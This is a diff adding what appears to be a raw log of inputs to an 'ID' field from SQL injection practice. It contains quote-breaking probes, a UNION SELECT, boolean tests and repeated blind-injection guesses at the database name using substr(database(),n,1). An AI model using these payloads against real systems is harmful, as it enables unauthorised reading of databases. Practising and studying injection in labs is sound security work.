@@ -1,0 +1,84 @@
+ID:1
+ID:1'
+ID:1'
+ID:1' -- 
+ID:1' union select 1,1,1 limit 1,1 -- 
+ID:1"
+ID:1'
+ID:1' and substr(database(),1,1)="s" -- 
+ID:1' and substr(database(),1,1)="a" -- 
+ID:1' and substr(database(),1,1)="i" -- 
+ID:1' and substr(database(),1,1)="s" -- 
+ID:1' and substr(database(),2,1)="s" -- 
+ID:1' and substr(database(),2,1)="e" -- 
+ID:1
+ID:1
+ID:1'
+ID:1' and 1=1 -- 
+ID:1 and substr(database(),1,1)="s" -- 
+ID:1 and substr(database(),1,1)="a" -- 
+ID:2
+ID:2'
+ID:2 and substr(database(),1,1)="s"
+ID:2 and substr(database(),1,1)="a"
+ID:1' or substr(database(),1,1)="a"
+ID:1' or substr(database(),1,1)="a" -- 
+ID:1
+ID:1‘
+ID:1"
+ID:1'
+ID:1" and substr(database(),1,1)="a" -- 
+ID:1" and substr(database(),1,1)="a" 
+ID:1" and substr(database(),1,1)="2" 
+ID:" and substr(database(),1,1)="2" 
+ID:" and substr(database(),1,1)="s" 
+ID:" and substr(database(),1,1)="s" -- 
+ID:1
+ID:1"
+ID:1" and 1=2
+ID:1 and 1=2-- 
+ID:1
+ID:1"
+ID:1"
+ID:1'
+ID:1' or substr(database(),1,1)="s"-- 
+ID:1' or substr(database(),1,1)="1"-- 
+ID:1' or substr(database(),1,1)="a"-- 
+ID:1' or substr(database(),1,1)="s"-- 
+ID:1' or substr(database(),1,1)='s'-- 
+ID:1' or substr(database(),1,1)='a'-- 
+ID:1" or substr(database(),1,1)='a'-- 
+ID:1"
+ID:1" and substr(database(),1,1)='s' -- 
+ID:1" and substr(database(),1,1)='s' -- 
+ID:1" and substr(database(),1,1)='s' 
+ID:1
+ID:1"
+ID:1" and substr(database(),1,1)="s" limit 1,1 -- 
+ID:1" and substr(database(),1,1)="a" limit 1,1 -- 
+ID:1" and substr(database(),1,1)="a
+ID:1
+ID:1"
+ID:1'
+ID:1 and 1=1
+ID:1 and 1=1
+ID:1' and substr(database(),1,1)=
+ID:1 and substr(database(),1,1)="s"
+ID:1 and substr(database(),1,1)="e"
+ID:1
+ID:1"
+ID:1'
+ID:1' and 1=1 -- 
+ID:1' and substr(database(),1,1)="s" -- 
+ID:1' and substr(database(),1,1)="a" -- 
+ID:1" and substr(database(),1,1)="a" -- 
+ID:1" and substr(database(),1,1)="s" -- 
+ID:1'
+ID:1"
+ID:1'"
+ID:1'"'
+ID:1"
+ID:1"'
+ID:1"
+ID:"1"
+ID:1
